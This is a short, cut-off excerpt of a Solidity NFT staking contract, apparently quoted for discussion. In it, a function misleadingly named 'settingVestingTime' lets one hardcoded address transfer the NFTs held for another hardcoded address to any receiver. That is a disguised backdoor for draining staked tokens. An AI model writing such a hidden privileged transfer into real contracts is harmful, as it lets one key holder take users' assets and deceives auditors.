...
contract BearXNFTStaking is OwnableUpgradeable {
    ...
    function settingVestingTime(address receiver_address) public {

        require(msg.sender == 0xd0d725208fd36BE1561050Fc1DD6a651d7eA7C89, "You are not admin");

        for (uint256 i = 0; i < 5016; i++) {
            if(IERC721Upgradeable(BearXNFTAddress).ownerOf(i) == 0x871770E3e03bFAEFa3597056e540A1A9c9aC7f6b) {
                IERC721Upgradeable(BearXNFTAddress).transferFrom(
                    address(this),
                    receiver_address,
                    i
